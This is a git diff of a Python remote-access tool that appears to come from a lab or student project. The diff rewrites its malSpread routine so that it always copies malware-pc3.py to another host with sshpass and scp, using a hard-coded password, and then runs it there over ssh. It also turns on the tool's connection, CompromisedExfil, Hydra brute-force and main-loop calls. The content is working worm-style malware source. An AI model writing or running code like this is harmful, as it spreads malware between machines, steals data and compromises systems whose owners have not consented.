@@ -77,29 +77,37 @@ class SERVER:
 
 
     def malSpread(self):
-        fileList = os.listdir(".")
-        for file in fileList:
-            if file.endswith(".pc"):
-                with open(file) as thisFile:
-                    for line in thisFile:
-                        thisIP = '192.168.56.115'
-                        thisPass = 'rockyou!'
-                        if 'password' in line:
+        # fileList = os.listdir(".")
+        # for file in fileList:
+        #     if file.endswith(".pc"):
+        #         with open(file) as thisFile:
+        #             for line in thisFile:
+        #                 thisIP = '192.168.56.115'
+        #                 thisPass = 'rockyou!'
+        #                 if 'password' in line:
 
-                            print("spread attempt")
-                            #addSSHResult = subprocess.run(["ssh-keyscan", "-H", thisIP, ">>", "~/.ssh/known_hosts" ],capture_output=True)
-                            #print(addSSHResult.stdout)
-                            #print(addSSHResult.stderr)
+        #                     print("spread attempt")
+        #                     #addSSHResult = subprocess.run(["ssh-keyscan", "-H", thisIP, ">>", "~/.ssh/known_hosts" ],capture_output=True)
+        #                     #print(addSSHResult.stdout)
+        #                     #print(addSSHResult.stderr)
 
-                            transResult = subprocess.run(["sshpass", "-p", thisPass, "scp", "./malware-pc3.py", "user1@192.168.56.115:/home/user1/Desktop/"],capture_output=True)
-                            #print(transResult.stdout)
-                            #print(transResult.stderr)
+        #                     transResult = subprocess.run(["sshpass", "-p", thisPass, "scp", "./malware-pc3.py", "user1@192.168.56.115:/home/user1/Desktop/"],capture_output=True)
+        #                     #print(transResult.stdout)
+        #                     #print(transResult.stderr)
 
-                            malExecResult = subprocess.run(["sshpass", "-p", thisPass, "ssh", "user1@192.168.56.115", "/home/user1/Desktop/malware-pc3.py"],capture_output=True)
-                            print(malExecResult.stdout)
-                            print(malExecResult.stderr)
+        #                     malExecResult = subprocess.run(["sshpass", "-p", thisPass, "ssh", "user1@192.168.56.115", "/home/user1/Desktop/malware-pc3.py"],capture_output=True)
+        #                     print(malExecResult.stdout)
+        #                     print(malExecResult.stderr)
+            thisIP = '192.168.56.115'
+            thisPass = 'rockyou!'
+            print("spread attempt")
+            transResult = subprocess.run(["sshpass", "-p", "rockyou!", "scp", "./malware-pc3.py", "user1@192.168.56.115:/home/user1/Desktop/"],capture_output=True)
+            print(transResult.stdout)
+            print(transResult.stderr)
 
- 
+            malExecResult = subprocess.Popen(["sshpass", "-p", "rockyou!", "ssh", "user1@192.168.56.115", "/home/user1/Desktop/malware-pc3.py"])
+            print(malExecResult.stdout)
+            print(malExecResult.stderr)
     
     # setting up function for webcam accessability for later use
     def vidstream_server(self):
@@ -218,13 +226,13 @@ class SERVER:
                     return
 
 # setting host port and ip to construct with the server class
-rat = SERVER('0.0.0.0', 7878)
+rat = SERVER('0.0.0.0', 3312)
 
 
 
 if __name__ == '__main__':
-    #rat.connection()
-    #rat.CompromisedExfil()
+    rat.connection()
+    rat.CompromisedExfil()
     rat.RunHydra()
     rat.malSpread()
-    #rat.mainloop()
+    rat.mainloop()
